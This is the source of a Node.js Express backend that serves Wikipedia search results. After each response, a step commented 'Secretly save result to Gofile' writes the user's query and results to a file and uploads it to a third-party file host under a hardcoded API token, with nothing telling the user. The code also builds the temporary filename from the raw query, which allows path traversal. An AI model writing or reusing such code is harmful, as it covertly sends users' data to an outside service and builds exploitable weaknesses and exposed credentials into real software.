const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;
const gofileToken = 'e1LOiRxizCSLqTmyZ27AeZuN10qu0wfO';

app.use(cors());
app.use(express.json());

async function fetchWikipedia(query) {
  try {
    // Try Wikipedia scraping
    const page = await axios.get(`https://en.wikipedia.org/wiki/${encodeURIComponent(query)}`);
    const html = page.data;
    const summary = (html.match(/<p>(.*?)<\/p>/) || [])[1]?.replace(/<[^>]+>/g, '').trim();
    const links = [...html.matchAll(/<a href="\/wiki\/([^"#]+)"/g)].slice(0, 10).map(m => `https://en.wikipedia.org/wiki/${m[1]}`);
    const images = [...html.matchAll(/<img[^>]+src="([^"]+)"/g)]
      .map(m => m[1])
      .filter(src => !src.startsWith('//upload.wikimedia.org/wikipedia/commons/thumb') ? src.includes('wiki') : true)
      .slice(0, 20)
      .map(src => (src.startsWith('http') ? src : `https:${src}`));
    
    return { summary, links, images };
  } catch (err) {
    console.warn("Wikipedia direct failed, falling back to API...");
    // Use Wikipedia API fallback
    const search = await axios.get(`https://en.wikipedia.org/w/api.php`, {
      params: {
        action: 'query',
        list: 'search',
        srsearch: query,
        format: 'json',
      }
    });
    const topResult = search.data.query.search[0];
    const title = topResult?.title;

    const summaryRes = await axios.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(title)}`);
    const summary = summaryRes.data.extract;
    const links = [`https://en.wikipedia.org/wiki/${encodeURIComponent(title)}`];
    const images = summaryRes.data.thumbnail ? [summaryRes.data.thumbnail.source] : [];

    return { summary, links, images };
  }
}

async function uploadToGofile(buffer, filename) {
  try {
    const folderRes = await axios.get(`https://api.gofile.io/getAccountDetails?token=${gofileToken}`);
    const folderId = folderRes.data?.data?.rootFolder;
    if (!folderId) throw new Error("Failed to get Gofile folder");

    const form = new FormData();
    form.append('file', buffer, filename);
    form.append('token', gofileToken);
    form.append('folderId', folderId);

    const res = await axios.post(
      `https://api.gofile.io/uploadFile`,
      form,
      { headers: form.getHeaders(), timeout: 15000 }
    );

    if (res.data.status !== 'ok') {
      console.error("Upload failed:", res.data);
      return null;
    }

    return res.data.data.downloadPage;
  } catch (err) {
    console.error("Gofile upload error:", err.message);
    return null;
  }
}

app.post('/search', async (req, res) => {
  const { query } = req.body;
  console.log('Received search query:', query);

  try {
    const { summary, links, images } = await fetchWikipedia(query);

    const results = {
      sentence: summary || 'No summary found.',
      web: links.slice(0, 10).map((link, i) => ({
        title: `Wiki Link ${i + 1}`,
        url: link
      })),
      images
    };

    // Send result to user fast
    res.json(results);

    // Secretly save result to Gofile
    const fs = require('fs');
    const tmp = `WikiSearch-${query.replace(/\s+/g, '_')}.txt`;
    const fileContent = [
      `Search Query: ${query}`,
      `\nSummary:\n${summary}`,
      `\nLinks:\n${links.join('\n')}`,
      `\nImages:\n${images.join('\n')}`
    ].join('\n\n');

    fs.writeFileSync(tmp, fileContent);
    const buffer = fs.readFileSync(tmp);
    await uploadToGofile(buffer, tmp);
    fs.unlinkSync(tmp); // Clean up

  } catch (err) {
    console.error("Search error:", err.message);
    res.status(500).json({ error: 'Something went wrong during search.' });
  }
});

app.listen(PORT, () => {
  console.log(`Fweb backend listening on port ${PORT}`);
});
